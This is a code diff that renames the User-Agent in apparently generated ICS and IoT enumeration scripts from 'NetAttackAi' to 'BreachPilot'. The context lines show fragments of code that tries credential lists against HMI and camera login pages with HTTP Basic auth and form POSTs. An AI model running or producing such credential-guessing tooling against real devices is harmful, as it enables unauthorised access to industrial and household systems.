@@ -465,7 +465,7 @@ CREDS = [
 def probe(scheme: str, port: int, path: str) -> tuple[int, str, dict[str, str]]:
     url = f"{{scheme}}://{{TARGET}}:{{port}}{{path}}"
     try:
-        req = urllib.request.Request(url, headers={{"User-Agent": "NetAttackAi-ICS-Enum/1.0"}})
+        req = urllib.request.Request(url, headers={{"User-Agent": "BreachPilot-ICS-Enum/1.0"}})
         with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
             body = resp.read(8192).decode(errors="replace")
             return resp.status, body, dict(resp.headers)
@@ -504,7 +504,7 @@ def try_login(scheme: str, port: int, login_path: str) -> list[dict]:
         # Try HTTP Basic first (many HMIs use it)
         try:
             req = urllib.request.Request(url, headers={{
-                "User-Agent": "NetAttackAi-ICS-Enum/1.0",
+                "User-Agent": "BreachPilot-ICS-Enum/1.0",
                 "Authorization": "Basic " + base64.b64encode(f"{{u}}:{{p}}".encode()).decode(),
             }})
             with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
@@ -520,7 +520,7 @@ def try_login(scheme: str, port: int, login_path: str) -> list[dict]:
         try:
             data = urllib.parse.urlencode({{"username": u, "password": p, "user": u, "pass": p}}).encode()
             req = urllib.request.Request(url, data=data, method="POST", headers={{
-                "User-Agent": "NetAttackAi-ICS-Enum/1.0",
+                "User-Agent": "BreachPilot-ICS-Enum/1.0",
                 "Content-Type": "application/x-www-form-urlencoded",
             }})
             with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
@@ -651,7 +651,7 @@ CREDS = [
 def probe(scheme: str, port: int, path: str) -> tuple[int, str, dict[str, str]]:
     url = f"{{scheme}}://{{TARGET}}:{{port}}{{path}}"
     try:
-        req = urllib.request.Request(url, headers={{"User-Agent": "NetAttackAi-IoT-Enum/1.0"}})
+        req = urllib.request.Request(url, headers={{"User-Agent": "BreachPilot-IoT-Enum/1.0"}})
         with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
             body = resp.read(8192).decode(errors="replace")
             return resp.status, body, dict(resp.headers)
@@ -700,7 +700,7 @@ def try_login(scheme: str, port: int, login_path: str) -> list[dict]:
         # HTTP Basic first (many IoT cams use it)
         try:
             req = urllib.request.Request(url, headers={{
-                "User-Agent": "NetAttackAi-IoT-Enum/1.0",
+                "User-Agent": "BreachPilot-IoT-Enum/1.0",
                 "Authorization": "Basic " + base64.b64encode(f"{{u}}:{{p}}".encode()).decode(),
             }})
             with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
@@ -716,7 +716,7 @@ def try_login(scheme: str, port: int, login_path: str) -> list[dict]:
         try:
             data = urllib.parse.urlencode({{"username": u, "password": p, "user": u, "pass": p}}).encode()
             req = urllib.request.Request(url, data=data, method="POST", headers={{
-                "User-Agent": "NetAttackAi-IoT-Enum/1.0",
+                "User-Agent": "BreachPilot-IoT-Enum/1.0",
                 "Content-Type": "application/x-www-form-urlencoded",
             }})
             with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
